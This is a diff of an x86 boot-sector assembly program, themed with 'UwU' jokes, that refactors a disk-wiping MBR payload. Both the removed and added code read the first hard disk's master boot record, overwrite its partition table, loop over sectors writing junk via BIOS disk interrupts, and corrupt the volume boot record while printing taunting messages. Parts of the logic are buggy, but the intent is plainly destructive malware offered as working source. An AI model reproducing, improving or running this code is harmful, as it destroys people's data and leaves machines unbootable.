@@ -1,309 +1,191 @@
 [org 0x7C00]
 
+
 ikuyooo:
+
     mov ax, 0x07C0
     mov ds, ax
     mov es, ax
     mov fs, ax
     mov gs, ax
     mov ss, ax
+    mov sp, 0x7C00 
+
 
     mov si, sayonara_tehehe
-    call print_uwu
+    call print_string
+
 
     call uwu_payload
 
-    jmp halt
 
-print_uwu:
+    jmp $
+
+
+print_string:
     mov ah, 0x0E
+.print_loop:
     mov al, [si]
+    cmp al, 0x00
+    je .print_done
     int 0x10
     inc si
-    cmp al, 0x00
-    jne print_uwu
+    jmp .print_loop
+.print_done:
     ret
+
 
 uwu_payload:
 
     mov si, uwu_key
     mov cx, 5
-OwO_circle:
+.decrypt_loop:
     lodsb
-    xor [si-1], al
-    loop OwO_circle
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x02
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x01
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-
-    mov si, 0x1BE
-    mov cx, 4
-uwu_circle:
-    mov di, 0x7C00
-    mov dx, [si]
-    add dx, [si+2]
-    cmp dx, 0x0000
-    je tired_oWo
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, [si+1]
-    mov cl, [si+2]
-    mov dh, [si+3]
-    mov dl, 0x80
-    int 0x13
-    mov si, uwu_uwu
-    mov di, 0x7C00
-    mov cx, 512
-    rep movsb
-tired_oWo:
-    add si, 16
-    loop uwu_circle
-
-    mov si, uwu_uwu
-    mov di, 0x1BE
-    mov cx, 64
-    rep movsb
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x03
-    mov al, 0xFF
-    mov ch, 0x00
-    mov cl, 0x01
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    mov si, uwu_uwu
-    mov di, 0x7C00
-    mov cx, 512 * 255
-    rep movsb
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x02
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    mov si, uwu_uwu
-    mov di, 0x7C00
-    mov cx, 512
-    rep movsb
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x03
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    mov si, uwu_uwu
-    mov di, 0x7C00
-    mov cx, 512
-    rep movsb
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x04
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    mov si, uwu_uwu
-    mov di, 0x7C00
-    mov cx, 512
-    rep movsb
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x05
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    mov si, uwu_uwu
-    mov di, 0x7C00
-    mov cx, 512
-    rep movsb
-
-    mov si, 0x1BE
-    mov cx, 4
-oya_oya_OwO:
-    mov di, 0x7C00
-    mov dx, [si]
-    add dx, [si+2]
-    cmp dx, 0x0000
-    je tehehe_UwU
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, [si+1]
-    mov cl, [si+2]
-    mov dh, [si+3]
-    mov dl, 0x80
-    int 0x13
-    mov si, Ayaya_OwO
-    mov di, 0x7C00 + 44
-    mov cx, 11
-    rep movsb
-tehehe_UwU:
-    add si, 16
-    loop oya_oya_OwO
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x02
-    mov al, 0x20
-    mov ch, 0x00
-    mov cl, 0x01
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    mov si, uwu_uwu
-    mov di, 0x7C00
-    mov cx, 512 * 32
-    rep movsb
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x02
-    mov al, 0x20
-    mov ch, 0x00
-    mov cl, 0x01
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    mov si, 0x7C00
-    mov di, 0x7E00
-    mov cx, 512 * 32
-    rep movsb
-
-    mov si, 0x7E00
-    mov cx, 512 * 32 / 32
-etooo_ne_bleeh:
-    mov di, si
-    add di, 0x1C
-    mov al, [di]
-    cmp al, 0x00
-    je next_file
-    mov [di], 'u'
-    inc di
-    mov [di], 'w'
-    inc di
-    mov [di], 'u'
-    next_file:
-    add si, 32
-    loop etooo_ne_bleeh
+    loop .decrypt_loop
 
 
-    call miku_miku_beam
-    call miku_miku_beam_owowowo
+    call read_disk_mbr_to_buffer
 
-    ret
-
-miku_miku_beam:
-
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7C00
-    mov ah, 0x02
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x01
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-
-    mov si, 0x7C00
-    mov di, 0x7C00
-    mov cx, 512
-    mov al, 0x00
-nyahallooo:
+    mov di, 0x7C00 + 0x1BE
+    mov cx, 4 * 16 ; 
+    mov al, 'U'
+.overwrite_pt_loop:
     stosb
-    loop nyahallooo
+    loop .overwrite_pt_loop
+
+
+    call write_buffer_to_disk_mbr
 
     mov cx, 255
-harikitte_ikou:
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x02
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    inc cl
-    loop harikitte_ikou
+.sector_wipe_loop:
+    push cx 
 
-    ret
 
-miku_miku_beam_owowowo:
+    call fill_buffer_with_uwu
+
 
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x7C00
-    mov ah, 0x02
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x01
+    mov ah, 0x03 
+    mov al, 0x01 
+    mov ch, 0x00 
+
     mov dh, 0x00
-    mov dl, 0x80
+    mov dl, 0x80 
     int 0x13
 
-    mov si, 0x7C00
-    mov di, 0x7C00
-    mov cx, 512
-    mov al, 0x00
-chiyo_chiyo:
-    stosb
-    loop chiyo_chiyo
+    pop cx  
+    inc cl 
+    loop .sector_wipe_loop
 
-    mov cx, 255
-chiyo_chiyo_chiyonoo:
-    mov ah, 0x03
-    mov al, 0x01
-    mov ch, 0x00
-    mov cl, 0x02
-    mov dh, 0x00
-    mov dl, 0x80
-    int 0x13
-    inc cl
-    loop chiyo_chiyo_chiyonoo
+
+    call read_disk_vbr_to_buffer
+    call corrupt_vbr
+    call write_buffer_to_disk_vbr
 
     ret
 
-sayonara_tehehe:
-    db 'Uwu Uwu bye bye! Tehehe...', 0x0A, 0x00
 
-uwu_uwu:
-    db 'UwU I got ya!', 0x00
+sayonara_tehehe: db 'Uwu Uwu bye bye! Tehehe...', 0x0D, 0x0A, 0x00
+uwu_uwu:        db 'UwU I got ya!', 0x00
+Ayaya_OwO:      db 'UwU', 0x00
+uwu_key:        db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo'
 
-Ayaya_OwO:
-    db 'UwU', 0x00
 
-uwu_key:
-    db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo'
+read_disk_mbr_to_buffer:
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02 
+    mov al, 0x01 
+    mov ch, 0x00 
+    mov cl, 0x01 
+    mov dh, 0x00 
+    mov dl, 0x80 
+    int 0x13
+    ret
 
-times 510 - ($ - ikuyooo) db 0
+
+write_buffer_to_disk_mbr:
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x03 
+    mov al, 0x01 
+    mov ch, 0x00 
+    mov cl, 0x01 
+    mov dh, 0x00 
+    mov dl, 0x80 
+    int 0x13
+    ret
+
+
+read_disk_vbr_to_buffer:
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02 
+    mov al, 0x01 
+    mov ch, 0x00 
+    mov cl, 0x02 
+    mov dh, 0x00 
+    mov dl, 0x80 
+    int 0x13
+    ret
+
+write_buffer_to_disk_vbr:
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x03 
+    mov al, 0x01 
+    mov ch, 0x00 
+    mov cl, 0x02 
+    mov dh, 0x00 
+    mov dl, 0x80 
+    int 0x13
+    ret
+
+
+fill_buffer_with_uwu:
+    pusha
+    mov di, 0x7C00
+    mov cx, 512 / 9 
+    mov si, uwu_uwu
+.fill_loop:
+    push cx
+    mov cx, 9
+.copy_string:
+    mov al, [si]
+    stosb
+    inc si
+    loop .copy_string
+    mov si, uwu_uwu
+    pop cx
+    loop .fill_loop
+
+    mov cx, 512 % 9
+    mov al, 'U'
+.fill_remainder:
+    stosb
+    loop .fill_remainder
+    popa
+    ret
+
+
+corrupt_vbr:
+    pusha
+
+    mov di, 0x7C00 + 0x03 
+    mov al, 'w'
+    stosb
+    stosb
+    stosb
+    stosb
+    stosb
+    popa
+    ret
+
+times 510-($-$$) db 0
 dw 0xAA55
